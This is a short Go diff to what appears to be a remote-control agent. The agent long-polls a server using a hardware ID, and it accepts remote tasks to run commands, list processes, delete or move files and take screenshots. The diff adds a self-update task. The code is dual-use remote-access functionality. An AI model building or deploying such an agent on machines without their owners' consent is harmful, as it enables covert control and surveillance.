@@ -30,9 +30,10 @@ import (
 )
 
 var baseURL string
+var apiURL = baseURL + "/api"
 
 func longPoll(hwid string) {
-	client := agent.NewClient(baseURL)
+	client := agent.NewClient(apiURL)
 	client.SupportedTaskTypes = []string{
 		"execute_cmd",
 		"proclist",
@@ -42,6 +43,7 @@ func longPoll(hwid string) {
 		"deletefile",
 		"movefile",
 		"screenshot",
+		"update",
 	}
 	client.UseAccount(hwid)
 	for {
@@ -80,7 +82,7 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 		moveFileTask(client, taskID, body)
 	case "screenshot":
 		screenshotTask(client, taskID, body)
+	case "update":
+		selfUpdateTask(client, taskID, body)
 	}
 }
-
-
